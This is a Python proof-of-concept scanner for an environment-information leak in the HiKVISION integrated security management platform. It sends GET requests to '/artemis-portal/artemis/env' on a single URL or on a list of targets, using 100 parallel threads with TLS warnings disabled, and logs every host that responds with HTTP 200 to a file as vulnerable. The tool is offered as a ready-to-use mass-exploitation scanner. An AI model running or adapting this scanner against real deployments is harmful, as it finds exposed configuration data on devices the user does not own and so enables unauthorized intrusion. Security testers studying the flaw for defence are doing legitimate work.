# HiKVISION综合安防管理平台env信息泄漏
import re,requests,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
def banner():
    test = """     _   _ _ _  ____     _____ ____ ___ ___  _   _ 
 | | | (_) |/ /\ \   / /_ _/ ___|_ _/ _ \| \ | |
 | |_| | | ' /  \ \ / / | |\___ \| | | | |  \| |
 |  _  | | . \   \ V /  | | ___) | | |_| | |\  |
 |_| |_|_|_|\_\   \_/  |___|____/___\___/|_| \_|
                                                
                                 version:1.0.8 
                                 author:guoguo12138                             
"""
    print(test)

def main():
    banner()
    # 处理命令行参数了
    parser = argparse.ArgumentParser(description="HiKVISION综合POC")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()

    if args.url and not args.file:
         poc(args.url)
            # exp(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
                
def poc(target):
    payload_url = '/artemis-portal/artemis/env'
    url = target+payload_url
    try:
        # res = requests.get(url=url)
        res2 = requests.get(url=url)
        if res2.status_code == 200:
                print(f"[+该url存在漏洞{target}")
                with open('try001.txt','a',encoding='utf-8') as fp:
                    fp.write(target+"\n")
                    return True
        else:
                print(f"该url不存在漏洞{target}")
                return False
    except Exception as e:
        print(f"该url连接存在问题{target}")
        return False
if __name__ == '__main__':
    main()
